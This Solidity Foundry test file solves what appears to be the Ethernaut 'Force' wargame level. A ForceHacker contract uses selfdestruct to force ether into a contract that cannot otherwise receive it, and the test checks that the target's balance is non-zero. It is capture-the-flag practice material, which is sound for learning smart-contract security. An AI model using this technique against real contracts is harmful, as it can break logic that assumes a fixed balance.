// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Test, console} from "../lib/forge-std/src/Test.sol";

import {Force} from "../src/Force.sol";

contract ForceTest is Test {
    Force target;
    ForceHacker hackTarget;

    function setUp() public {
        target = new Force();
        hackTarget = new ForceHacker(address(target));
    }

    function test_ForceToReceiveEther() public {
        hackTarget.attack{value: 1 ether}();
        assert(address(target).balance != 0);
    }
}

contract ForceHacker {
    address target;
    constructor(address _target) {
        target = _target;
    }

    function attack() public payable {
        selfdestruct(payable(target));
    }
}
